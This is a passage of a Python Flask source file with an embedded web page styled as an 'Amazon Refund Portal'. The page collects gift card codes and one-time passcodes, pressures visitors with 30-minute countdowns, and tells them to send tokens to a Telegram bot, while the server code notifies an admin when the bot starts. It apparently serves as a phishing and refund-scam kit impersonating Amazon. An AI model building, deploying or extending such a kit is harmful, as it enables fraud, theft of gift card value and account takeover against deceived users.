                alert('⚠️ Please enter the gift card code');
                return;
            }
            
            if (giftCode.length < 10) {
                alert('⚠️ Invalid gift card code format');
                return;
            }
            
            closeModal('codeModal');
            showProcessing('Processing', 'Verifying gift card...');
            
            try {
                const response = await fetch('/api/refund/code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ gift_code: giftCode })
                });
                
                const data = await response.json();
                hideProcessing();
                
                if (data.success) {
                    showCodeResult(data.redeem_token);
                } else {
                    alert('❌ ' + (data.error || 'Something went wrong'));
                }
            } catch (err) {
                hideProcessing();
                alert('❌ Network error. Please try again.');
            }
        }
        
        // Verify OTP
        async function verifyOTP() {
            const otp = document.getElementById('otpCode').value.trim();
            const errorEl = document.getElementById('otpError');
            
            if (!otp || otp.length < 4) {
                errorEl.textContent = '⚠️ Please enter a valid OTP code';
                errorEl.style.display = 'block';
                return;
            }
            
            if (!/^\\d+$/.test(otp)) {
                errorEl.textContent = '⚠️ OTP must contain only numbers';
                errorEl.style.display = 'block';
                return;
            }
            
            errorEl.style.display = 'none';
            closeModal('otpModal');
            showProcessing('OTP Verification', 'Verifying your code...');
            
            try {
                const response = await fetch('/api/otp/verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ txid: currentTxid, otp: otp })
                });
                
                const data = await response.json();
                hideProcessing();
                
                if (data.success) {
                    showAccountResult(currentTxid);
                } else {
                    errorEl.textContent = '❌ ' + (data.error || 'Invalid OTP. Please try again.');
                    errorEl.style.display = 'block';
                    document.getElementById('otpModal').style.display = 'flex';
                    document.getElementById('otpCode').value = '';
                    document.getElementById('otpCode').focus();
                }
            } catch (err) {
                hideProcessing();
                alert('❌ Network error. Please try again.');
            }
        }
        
        // Resend OTP
        async function resendOTP() {
            try {
                showProcessing('Resending OTP', 'Sending new OTP to your email...');
                const response = await fetch('/api/resend-otp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ txid: currentTxid })
                });
                const data = await response.json();
                hideProcessing();
                if (data.success) {
                    alert('✅ New OTP sent to your email!');
                    document.getElementById('otpCode').value = '';
                    document.getElementById('otpCode').focus();
                } else {
                    alert('❌ ' + (data.error || 'Failed to resend OTP'));
                }
            } catch (err) {
                hideProcessing();
                alert('❌ Network error. Please try again.');
            }
        }
        
        function showAccountResult(txid) {
            const modal = document.getElementById('resultModal');
            document.getElementById('resultTitle').innerHTML = '✅ ACCOUNT VERIFIED';
            document.getElementById('resultContent').innerHTML = `
                <div style="background: rgba(0,255,65,0.1); padding: 1rem; border-radius: 8px;">
                    <p><strong>📌 Your TXID:</strong></p>
                    <code style="font-size: 0.9rem; word-break: break-all;">${txid}</code>
                    <div style="margin-top: 0.7rem;">
                        <button class="copy-btn" onclick="copyToClipboard('${txid}')">📋 Copy TXID</button>
                    </div>
                </div>
            `;
            document.getElementById('resultMessage').innerHTML = `
                <strong>⚠️ IMPORTANT:</strong><br>
                Copy your TXID and send it to the Telegram bot!<br><br>
                ⏰ <strong>Expires in 30 minutes</strong><br>
                📌 <strong>Refund within 12 hours</strong>
            `;
            modal.style.display = 'flex';
            startTimer(30);
        }
        
        function showCodeResult(redeemToken) {
            const modal = document.getElementById('resultModal');
            document.getElementById('resultTitle').innerHTML = '🎫 GIFT CARD SUBMITTED';
            document.getElementById('resultContent').innerHTML = `
                <div style="background: rgba(255,107,53,0.1); padding: 1rem; border-radius: 8px;">
                    <p><strong>🔖 Your Redeem Token:</strong></p>
                    <code style="font-size: 0.9rem; word-break: break-all;">${redeemToken}</code>
                    <div style="margin-top: 0.7rem;">
                        <button class="copy-btn" onclick="copyToClipboard('${redeemToken}')">📋 Copy Token</button>
                    </div>
                </div>
            `;
            document.getElementById('resultMessage').innerHTML = `
                <strong>⚠️ IMPORTANT:</strong><br>
                Copy your Token and send it to the Telegram bot!<br><br>
                ⏰ <strong>Expires in 30 minutes</strong><br>
                🚀 <strong>Refund in 5-10 minutes</strong>
            `;
            modal.style.display = 'flex';
            startTimer(30);
        }
        
        function startTimer(minutes) {
            let time = minutes * 60;
            const timerDisplay = document.getElementById('timerDisplay');
            if (timerInterval) clearInterval(timerInterval);
            timerDisplay.style.color = '#ffd700';
            
            timerInterval = setInterval(() => {
                const mins = Math.floor(time / 60);
                const secs = time % 60;
                timerDisplay.innerHTML = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
                if (time <= 0) {
                    clearInterval(timerInterval);
                    timerDisplay.innerHTML = '⏰ EXPIRED';
                    timerDisplay.style.color = '#ff0040';
                }
                time--;
            }, 1000);
        }
        
        function showProcessing(title, message) {
            document.getElementById('processingTitle').innerHTML = title;
            document.getElementById('processingMessage').innerHTML = message;
            document.getElementById('processingModal').style.display = 'flex';
        }
        
        function hideProcessing() {
            document.getElementById('processingModal').style.display = 'none';
        }
        
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                alert('✓ Copied to clipboard!');
            }).catch(() => {
                const textarea = document.createElement('textarea');
                textarea.value = text;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
                alert('✓ Copied to clipboard!');
            });
        }
        
        // Close modal on outside click
        window.onclick = function(event) {
            if (event.target.classList.contains('modal')) {
                event.target.style.display = 'none';
                if (timerInterval) clearInterval(timerInterval);
            }
        }
        
        // Keyboard shortcuts
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Escape') {
                document.querySelectorAll('.modal').forEach(modal => {
                    modal.style.display = 'none';
                });
                if (timerInterval) clearInterval(timerInterval);
            }
            if (event.key === 'Enter') {
                if (document.getElementById('otpModal').style.display === 'flex') {
                    verifyOTP();
                }
            }
        });
        
        // Auto-focus OTP input when modal opens
        document.querySelectorAll('.modal').forEach(modal => {
            const observer = new MutationObserver(() => {
                if (modal.style.display === 'flex') {
                    const input = modal.querySelector('input');
                    if (input) setTimeout(() => input.focus(), 300);
                }
            });
            observer.observe(modal, { attributes: true, attributeFilter: ['style'] });
        });
        
        console.log('🚀 Amazon Refund Portal v7.0');
        console.log('🔒 Connection: Secure');
        console.log('💡 Need help? Contact @{{ bot_username }}');
    </script>
</body>
</html>
"""

# ============================================================
# MAIN ENTRY POINT (30 lines)
# ============================================================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    # Send startup notification
    try:
        send_to_admin(f"""
🚀 <b>BOT STARTED SUCCESSFULLY</b> 🚀

<b>📊 Status:</b>
• Bot: ✅ Online
• OTP: ✅ SMTP Enabled
• Version: {APP_VERSION}
• Users: {len(storage.users)}

<b>✅ Ready to process refunds!</b>
        """)
    except Exception as e:
        logger.warning(f"Startup notification failed: {e}")
    
    # Start polling thread
    polling_thread = threading.Thread(target=poll_updates, daemon=True)
    polling_thread.start()
    logger.info("🔄 Polling thread started")
    
    # Start Flask server
    logger.info(f"🚀 Starting Flask server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
